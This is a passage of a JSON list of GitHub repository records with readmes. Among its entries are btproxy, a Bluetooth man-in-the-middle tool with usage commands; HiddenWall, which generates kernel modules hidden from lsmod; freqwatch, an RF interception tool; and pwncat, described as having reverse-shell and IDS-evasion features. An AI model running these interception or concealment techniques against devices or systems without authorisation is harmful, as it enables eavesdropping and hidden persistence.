guidelines](https://github.com/caddyserver/certmagic/blob/master/.github/CONTRIBUTING.md)** for instructions.\\n\\n\\n## Project History\\n\\nCertMagic is the core of Caddy's advanced TLS automation code, extracted into a library. The underlying ACME client implementation is [ACMEz](https://github.com/mholt/acmez). CertMagic's code was originally a central part of Caddy even before Let's Encrypt entered public beta in 2015.\\n\\nIn the years since then, Caddy's TLS automation techniques have been widely adopted, tried and tested in production, and served millions of sites and secured trillions of connections.\\n\\nNow, CertMagic is _the actual library used by Caddy_. It's incredibly powerful and feature-rich, but also easy to use for simple Go programs: one line of code can enable fully-automated HTTPS applications with HTTP->HTTPS redirects.\\n\\nCaddy is known for its robust HTTPS+ACME features. When ACME certificate authorities have had outages, in some cases Caddy was the only major client that didn't experience any downtime. Caddy can weather OCSP outages lasting days, or CA outages lasting weeks, without taking your sites offline.\\n\\nCaddy was also the first to sport \\\"on-demand\\\" issuance technology, which obtains certificates during the first TLS handshake for an allowed SNI name.\\n\\nConsequently, CertMagic brings all these (and more) features and capabilities right into your own Go programs.\\n\\nYou can [watch a 2016 dotGo talk](https://www.dotconferences.com/2016/10/matthew-holt-go-with-acme) by the author of this library about using ACME to automate certificate management in Go programs:\\n\\n[![Matthew Holt speaking at dotGo 2016 about ACME in Go](https://user-images.githubusercontent.com/1128849/49921557-2d506780-fe6b-11e8-97bf-6053b6b4eb48.png)](https://www.dotconferences.com/2016/10/matthew-holt-go-with-acme)\\n\\n\\n\\n## Credits and License\\n\\nCertMagic is a project by [Matthew Holt](https://twitter.com/mholt6), who is the author; and various contributors, who are credited in the commit history of either CertMagic or Caddy.\\n\\nCertMagic is licensed under Apache 2.0, an open source license. For convenience, its main points are summarized as follows (but this is no replacement for the actual license text):\\n\\n- The author owns the copyright to this code\\n- Use, distribute, and modify the software freely\\n- Private and internal use is allowed\\n- License text and copyright notices must stay intact and be included with distributions\\n- Any and all changes to the code must be documented\\n\"", "topics": ["automatic-https", "acme", "tls", "letsencrypt", "https"], "writeup": "", "ignoredescription": false, "id": 10, "full_name": "caddyserver/certmagic", "url": "https://github.com/caddyserver/certmagic", "topic_string": "automatic-https acme tls letsencrypt https"},
{"tags": [], "owner": "capnspacehook", "description": "An intuitive and encrypted in-memory filesystem (VFS)", "name": "pandorasbox", "topics_string": "", "language": "Go", "readme": "\"# Pandoras Box\\n\\n[![GoDoc](https://godoc.org/github.com/capnspacehook/pandorasbox?status.svg)](https://godoc.org/github.com/capnspacehook/pandorasbox)\\n\\n`pandorasbox` is a Go package that allows for simple use of both a host's filesystem, and a virtual filesystem.\\n\\nThe design goal of Pandora's Box is to easily facilitate the use of a transparently-encrypted VFS (virtual filesystem), and the host's filesystem. It does this by providing functions and methods that operate and look the same as the Go standard library `os` package. If you want to interact with the VFS, pass in a path that starts with `vfs://`, and Pandora's Box will automatically use the VFS. Otherwise, the host's filesystem will be used.\\n\\n## Using Pandora's Box\\n\\nBecause Pandora's Box has the same interface as the `os` package, giving your code access to a VFS is often as easy as importing `pandorasbox` and replacing `os` calls to `box` calls. Take this super simple function that copies files: \\n\\n```go\\nimport \\\"os\\\"\\n\\nfunc CopyFile(srcFile, dstFile string) error {\\n out, err := os.Create(dstFile)\\n defer out.Close()\\n if err != nil {\\n return err\\n }\\n\\n in, err := os.Open(srcFile)\\n defer in.Close()\\n if err != nil {\\n return err\\n }\\n\\n _, err = io.Copy(out, in)\\n if err != nil {\\n return err\\n }\\n\\n return nil\\n}\\n```\\n\\nAll it takes to make this function VFS-friendly is switching from using `os` to `pandorasbox`:\\n\\n```go\\nimport box \\\"github.com/capnspacehook/pandorasbox\\\"\\n\\nfunc init() {\\n box.InitGlobalBox()\\n}\\n\\nfunc CopyFile(srcFile, dstFile string) error {\\n out, err := box.Create(dstFile)\\n if err != nil {\\n return err\\n }\\n defer out.Close()\\n\\n in, err := box.Open(srcFile)\\n if err != nil {\\n return err\\n }\\n defer in.Close()\\n\\n _, err = io.Copy(out, in)\\n if err != nil {\\n return err\\n }\\n\\n return nil\\n}\\n```\\n\\n### Global vs. Local VFS\\n\\nYou probably noticed the call to `box.InitGlobalBox()` in the last example. This has to be called **before** the global VFS can be used. \\nFor ease of use, Pandora's box provides a global `Box` that is easily accessible, but in some cases a local `Box` may be desired. If you don't wish to use the global `Box`, don't call `box.InitGlobalBox()`, instead create a locally scoped `Box` by calling `box.NewBox()`. This allows you to easily pass a `Box` into functions or methods or embed a `Box` in a struct.\\n\\n### `io/ioutil` and `path/filepath` Functions\\n\\nPandora's Box also provides helper functions that are identical to functions from `io/ioutil` and `path/filepath`. These should be used of the Go standard library packages when using a `Box`. The Pandora's Box versions are VFS-friendly, and will work seamlessly with a VFS, while the Go standard library packages will not. If you're using the global `Box`, the `io/ioutil` functions can be called from the main import: `github.com/capnspacehook/pandorasbox`. If you're using a local `Box`, you'll need to import `github.com/capnspacehook/pandorasbox/ioutil` and pass in your `Box` to those functions.\\n\\nExample (error handling omitted):\\n\\n```go \\nimport (\\n box \\\"github.com/capnspacehook/pandorasbox\\\"\\n \\\"github.com/capnspacehook/pandorasbox/ioutil\\\"\\n)\\n\\nfunc init() {\\n box.InitGlobalBox()\\n}\\n\\nfunc WriteFileGlobalBox() {\\n box.WriteFile(\\\"vfs://file.txt\\\", []byte(\\\"Testing testing 1 2 3\\\"), 0644)\\n data, _ := box.ReadFile(\\\"vfs://file.txt\\\")\\n fmt.Println(string(data))\\n}\\n\\nfunc WriteFileLocalBox() {\\n myBox := box.NewBox()\\n\\n ioutil.WriteFile(myBox, \\\"vfs://file.txt\\\", []byte(\\\"Testing testing 1 2 3\\\"), 0644)\\n data, _ := ioutil.ReadFile(myBox, \\\"vfs://file.txt\\\")\\n fmt.Println(string(data))\\n}\\n```\\n\\n### Forcing use of Host FS/VFS\\n\\nIf for some reason you need to force the usage of either the host's filesystem or the VFS, Pandora's box has you covered. All of `pandorasbox`'s functions that are in also in `os` have 3 variants: normal, OS, and VFS. The normal variant auto-detirmines what to use based off the input path, as described earlier. The OS and VFS variants force the usage of a specific filesystem. For instance, `pandorasbox.Mkdir()` will auto-detirmine which filesystem to use, while `pandorasbox.OSMkdir()` will always use the host's filesystem, and `pandorasbox.VFSMkdir()` will always use the VFS. \\n\\n### Memory Safety\\n\\nAll files in the VFS are encrypted when not in use. When files from the VFS are opened, they are decrypted for the duration of the call that opened them. VFS files are then re-encrypted with a different random key when reading or writing from them is finished. That is, files in the VFS are only decrypted in memory for a brief time while the underlying data needs to be accessed. In other words, calling `Open()` on a VFS file **will not** decrypt it until `Close()` is called on it. It will only be decrypted in memory when it is internally opened by methods like `Read()`, `Write()`, `Truncate()`, etc. And it is immediately closed afterwards. So opening a VFS file and calling `Read()` on it 3 times will decrypt and re-encrypt it 3 times. This is to make sure data is encrypted in memory whenever possible.\\n\\nFor more information about the exact cryptographic code and algorithms used, refer to this repo: https://github.com/awnumar/memguard.\\n\\n## Acknowledgements\\n\\nThanks to AbsFs contributors for the amazing repos, 70% of the code is from repos from [this organization](https://github.com/absfs).\\n\\nTook some VFS specific tests from [this repo](https://github.com/blang/vfs), thanks to [blang](https://github.com/blang) for some good VFS tests.\\n\\nThanks to [awnumar](https://github.com/awnumar) for [memguard](https://github.com/awnumar/memguard), he created a great repo that is very easy to use safely.\\n\"", "topics": ["vfs", "virtual-file-system", "cryptography", "filesystem", "security"], "writeup": "", "ignoredescription": false, "id": 11, "full_name": "capnspacehook/pandorasbox", "url": "https://github.com/capnspacehook/pandorasbox", "topic_string": "vfs virtual-file-system cryptography filesystem security"},
{"tags": [], "owner": "ccrisan", "description": "A Video Surveillance OS For Single-board Computers", "name": "motioneyeos", "topics_string": "", "language": "Makefile", "readme": "\"**motionEyeOS** is a Linux distribution that turns your single board computer into a video surveillance system. Check out the [wiki](https://github.com/ccrisan/motioneyeos/wiki) for more details.\\n\\n[<img src=\\\"https://img.shields.io/badge/rating-4%2B%20stars-brightgreen.svg\\\">](https://recordnotfound.com/motioneyeos-ccrisan-2430)\\n\\nFollow us on facebook: [https://www.facebook.com/motioneyeos](https://www.facebook.com/motioneyeos).\\n\\nYou can support the development of motionEyeOS by making a small donation.\\n<a href=\\\"https://www.paypal.com/cgi-bin/webscr?cmd=_donations&business=ccrisan%40gmail%2ecom&lc=US&item_name=motionEyeOS&no_note=0&currency_code=USD&bn=PP%2dDonationsBF%3abtn_donate_LG%2egif%3aNonHostedGuest\\\"><img src=\\\"https://www.paypalobjects.com/en_US/i/btn/btn_donate_LG.gif\\\" alt=\\\"[paypal]\\\" /></a>\\n\"", "topics": ["dvr", "camera", "rpi"], "writeup": "", "ignoredescription": false, "id": 12, "full_name": "ccrisan/motioneyeos", "url": "https://github.com/ccrisan/motioneyeos", "topic_string": "dvr camera rpi"},
{"tags": [], "owner": "clong", "description": "Tweaks to make Windows 10 less annoying and more usable", "name": "MakeWindows10GreatAgain", "topics_string": "", "language": "PowerShell", "readme": "\"# Make Windows 10 Great Again\\nTweaks to make Windows 10 less annoying and more usable.\\n\\nHere's what this script does:\\n\\n1. Disables Cortana\\n2. Disables Notification Center\\n3. Disables automatic reboots after Windows Updates have been installed\\n4. Disables Microsoft.com accounts from Windows Login\\n5. Shows file extensions for known file types\\n6. Sets Explorer to open to \\\"This PC\\\"\\n7. Shows hidden files (not including OS files)\\n8. Uninstalls OneDrive\\n9. Shows \\\"This PC\\\" icon on Desktop\\n10. Enables developer mode (required for Linux Subsystem)\\n11. Installs the Linux Subsystem\\n12. Updates the Powershell Get-Help items\\n13. Disables SMBv1\\n14. Unpin all Start Menu items\\n15. Disables WPAD \\n\\n## Installation\\nUnfortunately you'll have to set your execution policy to unrestricted to use this script.\\n\\nFrom an Administrator Powershell prompt:\\n```\\nSet-ExecutionPolicy Unrestricted\\ncd MakeWindows10GreatAgain\\n.\\\\MakeWindows10GreatAgain.ps1\\nSet-ExecutionPolicy Restricted\\n```\\n\\n## Notes\\nI considered adding some tweaks to remove the default apps/tiles that come installed with the Win10 start menu, but I've been pleasantly surprised by [Classic Shell](http://classicshell.net/). It's an excellent start menu replacement for Win10. I recommend just installing that.\\n\\nThis script doesn't address any of the privacy issues of Windows 10 because there are already a [bunch of tools](http://www.ghacks.net/2015/08/14/comparison-of-windows-10-privacy-tools/) that already do that.\\n\"", "topics": [], "writeup": "This script doesn't address any of the privacy issues of Windows 10 because there are already a bunch of tools that already do that.", "ignoredescription": false, "id": 13, "full_name": "clong/MakeWindows10GreatAgain", "url": "https://github.com/clong/MakeWindows10GreatAgain", "topic_string": ""},
{"tags": [], "owner": "conorpp", "description": "Man in the Middle analysis tool for Bluetooth.", "name": "btproxy", "topics_string": "", "language": "Python", "readme": "\"\\n# Btproxy\\n\\n### (Unsupported)\\n\\n## Bluetooth Proxy tool\\n\\n[Walkthrough](https://conorpp.com/proxying-bluetooth-devices-for-security-analysis-using-btproxy)\\n![](http://conorpp.com/assets/images/btproxy/cover.jpg.fb.jpg)\\n\\n### Tested Devices\\n\\n* Pebble Steel smart watch\\n* Moto 360 smart watch\\n* OBDLink OBD-II Bluetooth Dongle\\n* Withings Smart Baby Monitor\\n\\nIf you have tried anything else, please let me know at conorpp (at) vt (dot) edu. \\n\\n### Dependencies\\n\\n- Need at least 1 Bluetooth card (either USB or internal).\\n- Need to be running Linux or another *nix.\\n- BlueZ 4\\n\\nFor a debian system, run\\n\\n```bash\\nsudo apt-get install bluez bluez-tools libbluetooth-dev python-dev\\n```\\n\\n### Installation\\n\\n```bash\\nsudo python setup.py install\\n```\\n\\n### Running\\n\\nTo run a simple MiTM or proxy on two devices, run\\n\\n```bash\\nbtproxy <master-bt-mac-address> <slave-bt-mac-address>\\n```\\n \\nRun `btproxy` to get a list of command arguments.\\n\\n#### Example\\n\\n```bash\\n# This will connect to the slave 40:14:33:66:CC:FF device and \\n# wait for a connection from the master F1:64:F3:31:67:88 device\\nbtproxy F1:64:F3:31:67:88 40:14:33:66:CC:FF\\n```\\n\\nWhere the master is typically the phone and the slave mac\\naddress is typically the other peripherial device (smart watch, headphones, keyboard, obd2 dongle, etc).\\n\\nThe master is the device the sends the connection request and the slave is \\nthe device listening for something to connect to it.\\n\\nAfter the proxy connects to the slave device and the master connects to the proxy device,\\nyou will be able to see traffic and modify it.\\n\\n#### How to find the BT MAC Address? \\n\\nWell, you can look it up in the settings usually for a phone. The most\\nrobost way is to put the device in advertising mode and scan for it.\\n\\nThere are two ways to scan for devices: scanning and inquiring.\\nhcitool can be used to do this:\\n\\n```bash\\nhcitool scan\\nhcitool inq\\n```\\n\\nTo get a list of services on a device:\\n\\n```bash\\nsdptool records <bt-address>\\n```\\n\\n### Usage\\n\\nSome devices may restrict connecting based on the name, class, or address of another bluetooth device. \\nSo the program will lookup those three properties of the target devices to be proxied,\\nand then clone them onto the proxying adapter(s).\\n\\nThen it will first try connecting to the slave device from the\\ncloned master adaptor. It will make a socket for each service\\nhosted by the slave and relay traffic for each one independently.\\n\\nAfter the slave is connected, the cloned slave adaptor will be set\\nto be listening for a connection from the master. At this point, the real master device\\nshould connect to the adaptor. After the master connects, the proxied connection\\nis complete.\\n\\n#### Using only one adapter\\n\\nThis program uses either 1 or 2 Bluetooth adapters. If you use one adapter, then only\\nthe slave device will be cloned. Both devices will be cloned if 2 adapters are used; this might\\nbe necessary for more restrictive Bluetooth devices.\\n\\n\\n### Advanced Usage\\n\\nManipulation of the traffic can be handled via python \\nby passing an inline script. Just implement the master_cb and\\nslave_cb callback functions. This are called upon receiving \\ndata and the returned data is sent back out to the corresponding device.\\n\\n```python\\n# replace.py\\ndef master_cb(req):\\n \\\"\\\"\\\"\\n Received something from master, about to be sent to slave.\\n \\\"\\\"\\\"\\n print '<< ', repr(req)\\n open('mastermessages.log', 'a+b').write(req)\\n return req\\n\\ndef slave_cb(res):\\n \\\"\\\"\\\"\\n Same as above but it's from slave about to be sent to master\\n \\\"\\\"\\\"\\n print '>> ', repr(res)\\n open('slavemessages.log', 'a+b').write(res)\\n return res\\n```\\n\\n\\nAlso see the example functions for [manipulating Pebble watch traffic in replace.py](https://github.com/conorpp/btproxy/blob/master/libbtproxy/replace.py#L33)\\n\\nThis code can be edited and reloaded during runtime by entering 'r'\\ninto the program console. This avoids the pains of reconnecting. Any errors\\nwill be caught and regular transmission will continue.\\n\\n### TODO\\n\\n- BLE\\n- Improve the file logging of the traffic and make it more interactive for\\n- replays/manipulation.\\n- Indicate which service is which in the output.\\n- Provide control for disconnecting/connecting services.\\n- PCAP file support\\n- ncurses?\\n\\n\\n### How it works\\n\\nThis program starts by killing the bluetoothd process, running it again with\\na LD_PRELOAD pointed to a wrapper for the bind system call to block bluetoothd\\nfrom binding to L2CAP port 1 (SDP). All SDP traffic goes over L2CAP port 1 so\\nthis makes it easy to MiTM/forward between the two devices and we don't have to\\nworry about mimicking the advertising.\\n\\nThe program first scans each device for their name and device class to make\\naccurate clones. It will append the string '_btproxy' to each name to make them\\ndistinguishable from a user perspective. Alternatively, you can specify the\\nnames to use at the command line.\\n\\nThe program then scans the services of the slave device. It makes a socket\\nconnection to each service and open a listening port for the master device to \\nconnect to. Once the master connects, the Proxy/MiTM is complete and output will be\\nsent to STDOUT.\\n\\n### Notes\\n\\nSome bluetooth devices have different methods of pairing which\\nmakes this process more complicated. Right now it supports SPP and legacy pin pairing.\\n\\nThis program doesn't yet have support for Bluetooth Low Energy.\\nA similiar approach to BLE can be taken.\\n\\n### Errors\\n\\n#### btproxy or bluetoothd hangs\\n\\nIf you are using bluez 5, you should try uninstalling and installing [bluez 4](http://www.bluez.org/download/). I've had problems with \\nbluez 5 hanging.\\n\\n#### error accessing bluetooth device\\n\\nMake sure the bluetooth adaptors are plugged in and enabled.\\n\\nRun\\n\\n```bash\\n # See the list of all adaptors\\n hciconfig -a\\n\\n # Enable\\n sudo hciconfig hciX up\\n\\n # if you get this message\\n Can't init device hci0: Operation not possible due to RF-kill (132)\\n\\n # Then try unblocking it with the rfkill command\\n sudo rfkill unblock all\\n```\\n\\n#### UserWarning: \\\\<path\\\\>/.python-eggs is writable by group/others\\n\\nFix\\n\\n```bash\\nchmod g-rw,o-x <path>/.python-eggs\\n```\\n\\n\\n\\n\\n\"", "topics": ["mitm", "bluetooth"], "writeup": "", "ignoredescription": false, "id": 14, "full_name": "conorpp/btproxy", "url": "https://github.com/conorpp/btproxy", "topic_string": "mitm bluetooth"},
{"tags": [], "owner": "CoolerVoid", "description": "Tool to generate a Linux kernel module for custom rules with Netfilter hooking. (block ports, Hidden mode, functions to protect etc)", "name": "HiddenWall", "topics_string": "", "language": "C", "readme": "\"# HiddenWall\\n<img align=\\\"center\\\" src=\\\"https://github.com/CoolerVoid/HiddenWall/blob/master/doc/hiddenwallCMD.png?raw=true\\\">\\n\\nHiddenWall is a Linux kernel module generator for custom rules with netfilter. (block ports, Hidden mode, rootkit functions etc).\\n<img align=\\\"right\\\" width=\\\"240\\\" height=\\\"220\\\" src=\\\"https://github.com/CoolerVoid/HiddenWall/blob/master/doc/wall.png\\\">\\nThe motivation: on bad situation, attacker can put your iptables/ufw to fall... but if you have HiddenWall, \\nthe attacker will not find the hidden kernel module that block external access, because have a hook to netfilter on \\nkernel land(think like a second layer for firewall).\\n\\nMy beginning purpose at this project is protect my personal server, now is protect the machines of my friends.\\nWhen i talk \\\"friends\\\", i say peoples that don't know how to write low level code. Using the HiddenWall you can \\ngenerate your custom kernel module for your firewall configuration. \\n\\nThe low level programmer can write new templates for modules etc...\\n\\n\\nFirst step, understand before run\\n--\\n\\nVerify if the kernel version is 3.x, 4.x or 5.x:\\n```\\nuname -r\\n```\\n\\nClone the repository\\n```\\ngit clone https://github.com/CoolerVoid/HiddenWall\\n```\\n\\nEnter the folder\\n```\\ncd HiddenWall/module_generator\\n```\\n\\nEdit your firewall rules in directory rules/server.yaml, the python scripts use that file to generate a new firewall module.\\n\\n```\\n$ cat rules/server.yaml\\nmodule_name: SandWall\\npublic_ports: 80,443,53\\nunhide_key: AbraKadabra\\nhide_key: Shazam\\nfake_device_name: usb14\\nliberate_in_2_out: True\\nwhitelist: \\n- machine: \\n ip: 192.168.100.181\\n open_ports: 22,21\\n- machine:\\n ip: 192.168.100.22\\n open_ports: 22\\n\\n```\\n\\nIf you want study the static code to generate, look the content at directory \\\"templates\\\".\\n\\n\\n\\n\\nSecond step, generate your module\\n--\\n\\nIf you want generate a kernel module following your YAML file of rules, follow that command:\\n\\n```\\n$ python3 WallGen.py --template template/hiddenwall.c -r rules/server.yaml\\n```\\nThis generate a generic module with rules of server.yaml, if you want to use another template you can use \\\"wall.c\\\", so template module \\\"hiddenwall\\\" have option to run on hidden mode(is not visible to \\\"# lsmod\\\" for example).\\n\\n\\n\\nThird step, install your module\\n--\\n\\nTo test module:\\n```\\n# cd output; make clean; make\\n# insmod SandWall.ko\\n```\\n\\nThe rule of YAML to generate module is simple, drop all out to in packets, accept ports 80,443 and 53. The machine 192*.181 can connect at ports 22 and 21...\\n\\nif you use nmap at localhost/127.0.0.1 you can view the ports open... because rule liberate_in_2_out is true.\\n\\nPassword to turn Firewall visible is \\\"AbraKadabra\\\".\\n\\nPassword to turn Firewall invisible is \\\"Shazam\\\".\\n\\nYou need to send password for your fake device \\\"usb14\\\".\\n\\nTo exit module, you need turn visible at \\\"lsmod\\\" command ...\\n\\n```\\n# echo \\\"AbraKadabra\\\" > /dev/usb14\\n# lsmod | grep SandWall\\n# rmmod SandWall\\n```\\n\\n\\nRandom notes\\n--\\n\\nTested on ubuntu 16 and fedora 29 at kernels \\\"3.x\\\",\\\"4.x\\\" and \\\"5.x\\\".\\n\\n\\nTODO\\n--\\n\\nSuport to IPV6.\\nMacro to select the interface(to use multiple modes for each interface).\\nOption to remove last logs when turn hide mode.\\nOption to search and remove others toolkits...\\nCode generator to BFP...\\n\\n\\nReferences\\n--\\n\\n*Wikipedia Netfilter* \\nhttps://en.wikipedia.org/wiki/Netfilter\\n\\n*Linux Device Drivers* \\nhttp://lwn.net/Kernel/LDD3/\\n\\n*M0nad's Diamorphine* \\nhttps://github.com/m0nad/Diamorphine/\\n\"", "topics": ["rootkit", "defensive", "firewall", "linux", "netfilter"], "writeup": "", "ignoredescription": false, "id": 15, "full_name": "CoolerVoid/HiddenWall", "url": "https://github.com/CoolerVoid/HiddenWall", "topic_string": "rootkit defensive firewall linux netfilter"},
{"tags": [], "owner": "covertcodes", "description": "Keep track of the airwaves with RTL-SDR; snoop and capture everything into a DB", "name": "freqwatch", "topics_string": "", "language": "C", "readme": "\"# Freqwatch v0.2\\nJoshua Davis (freqwatch -!- edgetera.net) \\n\\n# UPDATE:\\nThis is newer and does more: http://www.gammarf.io - check it out. \\nOr check out my SensorScape repo\\n\\nUpdates in v0.2\\n===============\\n\\n* Client ID goes to database\\n* Experimental GPS (not finished yet, need help testing)\\n\\n\\nIntroduction\\n============\\n\\n* Explore vast regions of the RF spectrum\\n\\n* Log radio activity to a mysql database for trend analysis\\n\\n* Delegate scanners to find radio traffic and log it\\n\\n* Delegate monitors to store interesting data in the database\\n\\n\\nUsage\\n=====\\n\\n* Install (see the INSTALL file)\\n\\n* Use the 'blacklist' file to prevent frequency ranges from showing up in\\n your database / output\\n\\n* Configure some sticks as scanners using freqwatch.conf. Scanners scan\\n frequency ranges and log signals above a defined threshold to the database,\\n in the 'freqs' table.\\n\\n* Configure other sticks as monitors by using the modified rtl_fm included.\\n Use regular rtl_fm options to specify frequency ranges (several to scan\\n different frequencies), etc. The output will be logged to the database\\n 'intercepts' table.\\n\\n* See the freqwatch.conf file for examples\\n\\n* Use the intercept.py file in the rtl_fm_new directory to pull data from\\n the monitor database. The monitor system still has problems (inserts\\n blanks in the output...)\\n\\n\\nUseful Commands\\n===============\\n\\n* Get rtl_fm_new data to listen to / decode: mysql --binary-mode -e \\\"select group_concat(data separator '') from intercepts order by date, time;\\\" -A -B -r -L -N freqwatch -u freqwatch -p > output\\n\\n* Or better yet, use intercept.py in the rtl_fm directory\\n\\n* Intercept WBFM: rtl_fm -f 95.7e6 -s 170k -A fast -r 32k -l 0 | play -r 32k -t raw -e s -b 16 -c 1 -V1 - (they suggest using -E deemp, but that doesn't work for me)\\n\\n* Listen to WBFM on the command line: cat file | play -t raw -r 32k -e signed-integer -b 16 -c 1 -V1 -\\n\\n\\nSecurity Note\\n==============\\n\\nYou should run freqwatch in a controlled environment (e.g. with the web and\\ndatabase servers on localhost, and a firewall blocking the relevant ports\\nfrom outsiders.)\\n\"", "topics": ["radio", "monitoring", "gps", "sdr"], "writeup": "", "ignoredescription": false, "id": 16, "full_name": "covertcodes/freqwatch", "url": "https://github.com/covertcodes/freqwatch", "topic_string": "radio monitoring gps sdr"},
{"tags": [], "owner": "cytopia", "description": "pwncat - netcat on steroids with Firewall, IDS/IPS evasion, bind and reverse shell, self-injecting shell and port forwarding magic - and its fully scriptable with Python (PSE)", "name": "pwncat", "topics_string": "", "language": "Shell", "readme": "\"**[Install](#tada-install)** |\\n**[TL;DR](#coffee-tldr)** |\\n**[Features](#star-features)** |\\n**[Behaviour](#cop-behaviour)** |\\n**[Docs](#closed_book-documentation)** |\\n**[Usage](#computer-usage)** |\\n**[Examples](#bulb-examples)** |\\n**[FAQ](#information_source-faq)** |\\n**[Contributing](#octocat-contributing)** |\\n**[Disclaimer](#exclamation-disclaimer)** |\\n**[License](#page_facing_up-license)**\\n\\n---\\n\\n<center><img alt=\\\"pwncat banner\\\" title=\\\"pwncat\\\" src=\\\"art/banner-1.png\\\" style=\\\"\\\"/></center>\\n\\n# pwncat\\n\\n[![](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)\\n[![PyPI](https://img.shields.io/pypi/v/pwncat)](https://pypi.org/project/pwncat/)\\n[![PyPI - Status](https://img.shields.io/pypi/status/pwncat)](https://pypi.org/project/pwncat/)\\n[![PyPI - Python Version](https://img.shields.io/pypi/pyversions/pwncat)](https://pypi.org/project/pwncat/)\\n[![PyPI - Format](https://img.shields.io/pypi/format/pwncat)](https://pypi.org/project/pwncat/)\\n[![PyPI - Implementation](https://img.shields.io/pypi/implementation/pwncat)](https://pypi.org/project/pwncat/)\\n[![PyPI - License](https://img.shields.io/pypi/l/pwncat)](https://pypi.org/project/pwncat/)\\n\\n[![Build Status](https://github.com/cytopia/pwncat/workflows/linting/badge.svg)](https://github.com/cytopia/pwncat/actions?workflow=linting)\\n[![Build Status](https://github.com/cytopia/pwncat/workflows/building/badge.svg)](https://github.com/cytopia/pwncat/actions?workflow=building)\\n\\n\\n> &nbsp;\\n> #### Netcat on steroids with Firewall, IDS/IPS evasion, bind and reverse shell, self-injecting shell and port forwarding magic - and its fully scriptable with Python ([PSE](pse/)).\\n> &nbsp;\\n\\n\\n<table border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" style=\\\"border-collapse:collapse; border:none;\\\">\\n <thead>\\n <tr valign=\\\"top\\\" border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" style=\\\"border:none;\\\">\\n <th border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" style=\\\"border:none;\\\">Code Style</td>\\n <th border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" style=\\\"border:none;\\\"></td>\\n <th border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" style=\\\"border:none;\\\">Integration Tests <sup><small>[2]</small></sup></td>\\n </tr>\\n </thead>\\n <tbody>\\n <tr valign=\\\"top\\\" border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" style=\\\"border:none;\\\">\\n <td border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" style=\\\"border:none;\\\">\\n <table>\\n <thead>\\n <tr>\\n <th>Styler</th>\\n <th>Status</th>\\n </tr>\\n </thead>\\n <tbody>\\n <tr>\\n <td><a href=\\\"https://github.com/psf/black\\\">Black</a></td>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=black\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/black/badge.svg\\\" /></a></td>\\n </tr>\\n <tr>\\n <td><a href=\\\"https://github.com/python/mypy\\\">mypy</a> <sup><small>[1]</small></sup></td>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=mypy\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/mypy/badge.svg\\\" /></a></td>\\n </tr>\\n <tr>\\n <td><a href=\\\"https://github.com/PyCQA/pycodestyle\\\">pycodestyle</a></td>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=pycode\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/pycode/badge.svg\\\" /></a></td>\\n </tr>\\n <tr>\\n <td><a href=\\\"https://github.com/PyCQA/pydocstyle\\\">pydocstyle</a></td>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=pydoc\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/pydoc/badge.svg\\\" /></a></td>\\n </tr>\\n <tr>\\n <td><a href=\\\"https://github.com/PyCQA/pylint\\\">pylint</a></td>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=pylint\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/pylint/badge.svg\\\" /></a></td>\\n </tr>\\n </tbody>\\n </table>\\n </td>\\n <td border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" style=\\\"border:none;\\\"></td>\\n <td border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\" style=\\\"border:none;\\\">\\n <table>\\n <thead>\\n <tr>\\n <th><sub>Python</sub><sup>OS</sup></th>\\n <th>Linux</th>\\n <th>MacOS</th>\\n <th>Windows</th>\\n </tr>\\n </thead>\\n <tbody>\\n <tr>\\n <th>2.7</th>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=ubu-2.7\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/ubu-2.7/badge.svg\\\" /></a></td>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=mac-2.7\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/mac-2.7/badge.svg\\\" /></a></td>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=win-2.7\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/win-2.7/badge.svg\\\" /></a></td>\\n </tr>\\n <tr>\\n <th>3.5</th>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=ubu-3.5\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/ubu-3.5/badge.svg\\\" /></a></td>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=mac-3.5\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/mac-3.5/badge.svg\\\" /></a></td>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=win-3.5\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/win-3.5/badge.svg\\\" /></a></td>\\n </tr>\\n <tr>\\n <th>3.6</th>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=ubu-3.6\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/ubu-3.6/badge.svg\\\" /></a></td>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=mac-3.6\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/mac-3.6/badge.svg\\\" /></a></td>\\n <td><a href=\\\"https://github.com/cytopia/pwncat/actions?workflow=win-3.6\\\"><img src=\\\"https://github.com/cytopia/pwncat/workflows/win-3.6/badge.svg\\\" /></a></td>\\n </tr>\\n <tr>\\n <th>3.7</th>\\n <td><a 